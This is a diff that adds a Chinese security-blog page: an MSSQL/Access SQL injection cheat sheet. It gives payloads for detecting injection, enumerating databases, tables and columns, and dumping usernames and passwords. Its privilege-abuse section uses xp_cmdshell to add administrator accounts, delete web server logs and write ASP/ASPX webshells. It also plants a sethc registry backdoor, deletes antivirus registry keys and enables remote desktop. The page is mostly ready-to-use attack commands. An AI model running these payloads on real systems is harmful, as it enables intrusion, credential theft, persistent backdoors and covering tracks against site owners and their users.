@@ -1,0 +1,366 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sql注入 | pony686</title>
+<link rel="shortcut icon" href="https://itxz.fun/favicon.ico?v=1599359105769">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://itxz.fun/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sql注入 | pony686 - Atom Feed" href="https://itxz.fun/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="判断语句
+1.判断是否有注入
+and 1=1
+and 1=2
+/
+-0
+判断注入的方法是一样的
+2.初步判断是否是mssql
+and user&gt;0
+3.判断数据库系统
+and (select count() from sysobjec..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://itxz.fun">
+  <img class="avatar" src="https://itxz.fun/images/avatar.png?v=1599359105769" alt="">
+  </a>
+  <h1 class="site-title">
+    pony686
+  </h1>
+  <p class="site-description">
+    pony686
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          python
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://itxz.fun" class="menu" target="_blank">
+          web安全
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sql注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-06
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>判断语句<br>
+1.判断是否有注入<br>
+and 1=1<br>
+and 1=2<br>
+/<br>
+-0<br>
+判断注入的方法是一样的<br>
+2.初步判断是否是mssql<br>
+and user&gt;0<br>
+3.判断数据库系统<br>
+and (select count(<em>) from sysobjects)&gt;0 mssql<br>
+and (select count(</em>) from msysobjects)&gt;0 access</p>
+<p>注入语句<br>
+4.注入参数是字符<br>
+'and [查询条件] and ''='<br>
+5.搜索时没过滤参数的<br>
+'and [查询条件] and '%25'='<br>
+6.猜数表名<br>
+and (select Count(*) from [表名])&gt;0<br>
+7.猜字段<br>
+and (select Count(字段名) from 表名)&gt;0<br>
+8.猜字段中记录长度<br>
+and (select top 1 len(字段名) from 表名)&gt;0<br>
+9.(1)猜字段的ascii值（access）<br>
+and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0<br>
+(2)猜字段的ascii值（mssql）<br>
+and (select top 1 unicode(substring(字段名,1,1)) from 表名)&gt;0</p>
+<p>实例：探测漏洞信息<br>
+http://testasp.vulnweb.com/showforum.asp?id=0<br>
+在加入'后 报错<br>
+//数据库版本<br>
+id=1 and 1=(select @@version)<br>
+//当前使用的数据库<br>
+id=1 and 1=(select db_name())</p>
+<p>实例：列数据库名称<br>
+//获取第一个用户数据库<br>
+and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)<br>
+and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name&lt;&gt; 'acublog')<br>
+//以此类推，可以获取全部用户数据库名<br>
+and 1=(select name from master..sysdatabases for xml path)</p>
+<p>实例：列表名<br>
+//获取表名<br>
+//获取第一张表 threads<br>
+?id=1 and 1=(select top 1 name from sysobjects where xtype='u')<br>
+//获取第二张表 users<br>
+?id=1 and 1=(select top 1 name from sysobjects where xtype='U' and name &lt;&gt; 'threads' )<br>
+//以此类推，可以获取全部表</p>
+<p>实例：列表的列名<br>
+获取表 users 的列名<br>
+//获取第一列列名 uname<br>
+?id=1 and 1=(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'users'))<br>
+//获取第二列列名 upass<br>
+?id=1 and 1=(select top 1 name from syscolumns where id =(select id from sysobjects where name = 'users') and name &lt;&gt; 'uname' )</p>
+<p>实例：列数据<br>
+//获取第一个用户名<br>
+?id=1 and 1=(select top 1 uname from users)<br>
+//获取第一个用户名对应的密码<br>
+?id=1 and 1=(select top 1 upass from users )</p>
+<p>union 联合查询<br>
+顺便查下版本和数据库名<br>
+union select null,@@version,db_name(),null,null</p>
+<p>如果要查其他数据库的表名还可以这样:<br>
+union select  null,(select top 1 name from [dbname]..sysobjects where xtype='u' and name not in(select top 0 name from [dbname]..sysobjects where xtype='u')),null,null</p>
+<p>union 列表名</p>
+<p>继续猜字段名(从0开始增加第二个top N的数字就可以遍历admin表的字段名了)<br>
+第一个表名<br>
+http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 0 name from syscolumns where id in (select id from sysobjects where name='password'))),null<br>
+第二个表名<br>
+http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name='password'))),null</p>
+<p>union 列列名<br>
+继续猜字段名(从0开始增加第二个top N的数字就可以遍历admin表的字段名了)<br>
+第一个列名<br>
+http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 0 name from syscolumns where id in (select id from sysobjects where name='password'))),null<br>
+第二个列名<br>
+http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 1 name from syscolumns where id in (select id from sysobjects where name='password'))),null<br>
+第三个列名</p>
+<p>http://192.168.0.240:8005/?id=1   union select null,(select top 1 name from syscolumns where id in (select id from sysobjects where name='password') and name not in (select top 2 name from syscolumns where id in (select id from sysobjects where name='password'))),null</p>
+<p>列数据<br>
+http://192.168.0.240:8005/?id=1   union select null,username,password  from password where username not in (select top 0 username from password)</p>
+<p>PART 3:  SqlServer不同权限利用<br>
+用户所处权限分析：</p>
+<p>sa权限<br>
+dbo<br>
+public</p>
+<p>权限判断语句<br>
+and 1=(select is_srvrolemember('sysadmin')) //判断是否是系统管理员<br>
+and 1=(select is_srvrolemember('db_owner')) //判断是否是库权限<br>
+and 1=(select is_srvrolemember('public'))   //判断是否为public权限<br>
+and 1=convert(int,db_name())或1=(select db_name())  //当前数据库名<br>
+and 1=(select @@servername)  //本地服务名<br>
+and 1=(select HAS_DBACCESS('master'))  //判断是否有库读取权限</p>
+<p>Sa权限的利用<br>
+注入用户密码<br>
+修改网站管理员密码<br>
+直接getshell<br>
+调用系统命令<br>
+创建系统管理员<br>
+操控文件<br>
+操控日志文件<br>
+getshell<br>
+创建sqlserver管理<br>
+系统服务操作<br>
+注册表操作<br>
+创建后门<br>
+开启3389</p>
+<p>SQLserver中的存储过程<br>
+<img src="https://itxz.fun/post-images/1599357937450.png" alt="" loading="lazy"></p>
+<p>修改网站管理员密码<br>
+;update admin set pass=‘e8dc763194f29433’ where admin=‘cracer’<br>
+将管理员表admin中admin用户的密码设置为e8dc763194f29433</p>
+<p>修改之前把原来密码备份<br>
+通常在密码解不出的情况下选择使用该方法</p>
+<p>直接getshell<br>
+修复上传<br>
+;EXEC sp_configure 'show advanced options',1;<br>
+RECONFIGURE;<br>
+;exec sp_configure 'Web Assistant Procedures', 1; RECONFIGURE</p>
+<p>http://mssql.sql.com/aspx.aspx?id=1%20;exec%20sp_makewebtask%20%20%27C:\Inetpub\wwwroot\8005\x1.asp%27,%27select%27%27&lt;%execute(request(&quot;cmd&quot;))%&gt;%27%27%27--</p>
+<p>调用系统命令xp_cmdshell<br>
+1.检测与恢复扩展存储<br>
+判断xp_cmdshell扩展存储是否存在<br>
+and 1=(select count(<em>) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell')<br>
+判断xp_regread扩展存储过程是否存在<br>
+and 1=(select count(</em>) from master.dbo.sysobjects where name='xp_regread')<br>
+恢复<br>
+;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br>
+;exec sp_dropextendedproc xp_cmdshell,'xplog70.dll'</p>
+<p>Xp_cmdshell执行命令</p>
+<p>新建用户<br>
+;exec master..xp_cmdshell 'net user test test /add'<br>
+;exec master..xp_cmdshell 'net localgroup administrators test /add'<br>
+操控日志<br>
+;exec master.dbo.xp_cmdshell 'del c:\winnt\system32\logfiles\w3svc5\ex070606.log '<br>
+Getshell<br>
+echo <sup>&lt;%Execute(request(&quot;a&quot;))%</sup>&gt; &gt; d:\www\123.asp<br>
+;exec master..xp_cmdshell 'echo ^&lt;%@ Page Language=&quot;Jscript&quot;%<sup>&gt;</sup>&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\WWW\233.aspx' ;--<br>
+操作注册表<br>
+删除注册表<br>
+reg delete HKLM\SOFTWARE\McAfee /f<br>
+导入注册表<br>
+Regedit /s d:\web\zh\hp.reg<br>
+导出注册表<br>
+regedit /e d:\web\zhao\aaa.reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\Wds\rdpwd\Tds\tcp&quot;</p>
+<p>创建sqlserver管理<br>
+添加和删除一个SA权限的用户test：（需要SA权限）<br>
+exec master.dbo.sp_addlogin test,password<br>
+exec master.dbo.sp_addsrvrolemember test,sysadmin</p>
+<p>系统服务操作<br>
+停掉或激活某个服务。 （需要SA权限）<br>
+exec master..xp_servicecontrol 'stop','schedule'<br>
+exec master..xp_servicecontrol 'start','schedule'</p>
+<p>注册表操作<br>
+启用存储过程<br>
+exec sp_addextendedproc xp_regread,'xpstar.dll'<br>
+;exec master.dbo.sp_addextendedproc0x780070005f007200650067007200650061006400,0x7800700073007400610072002e0064006c006c00—</p>
+<p>exec sp_addextendedproc xp_regwrite,'xpstar.dll'</p>
+<p>xp_regwrite 根键,子键, 值名, 值类型, 值<br>
+exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','REG_SZ','c:\windows\system32\cmd.exe'</p>
+<p>写入shift后门<br>
+exec xp_regwrite<br>
+0x484b45595f4c4f43414c5f4d414348494e45,0x534f4654574152455c4d6963726f736f66745c57696e646f7773204e545c43757272656e7456657273696f6e5c496d6167652046696c6520457865637574696f6e204f7074696f6e735c73657468632e657865,0x6465627567676572,0x5245475f535a,'c:\windows\system32\taskmgr.exe'--</p>
+<p>开启3389<br>
+;exec master..xp_cmdshell 'sc config termservice start=auto'<br>
+;exec master..xp_cmdshell 'net start termservice'<br>
+;exec master..xp_cmdshell 'reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0x0 /f'<br>
+//允许外部连接<br>
+;exec master..xp_cmdshell 'reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal<br>
+Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x50 /f'    //改端口到80<br>
+开启3389<br>
+;exec master..xp_cmdshell &quot;wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1&quot;--</p>
+<p>dbowner权限利用<br>
+1.判断数据库用户权限<br>
+and 1=(select is_member('db_owner'));--<br>
+2.搜索web目录<br>
+;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--<br>
+然后<br>
+;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree 'c:',1,1--<br>
+and(select dir from temp where id=1)&gt;0<br>
+由于不能一次性获取所有目录文件和文件夹名，因此需要更改ID的值，依次列出文件和文件夹</p>
+<p>getshell<br>
+找到web目录后，就可以写入一句话木马了<br>
+;alter database ssdown5 set RECOVERY FULL<br>
+;create table test(str image)--<br>
+;backup log ssdown5 to disk='c:\test' with init--<br>
+;insert into test(str)values ('&lt;%excute(request(&quot;cmd&quot;))%&gt;')--<br>
+;backup log ssdown5 to disk='c:\inetpub\wwwroot\x.asp'--<br>
+;alter database ssdown5 set RECOVERY simple</p>
+<p>PART 4:  SqlServer 工具使用<br>
+穿山甲、萝卜头、sqlmap等</p>
+<p>掌握sqlserver常用操作<br>
+了解sqlserver 手工注入<br>
+学会挖掘注入和利用工具使用</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://itxz.fun/post/xin-xi-shou-ji-01/">
+              <h3 class="post-title">
+                信息收集01
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://itxz.fun/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
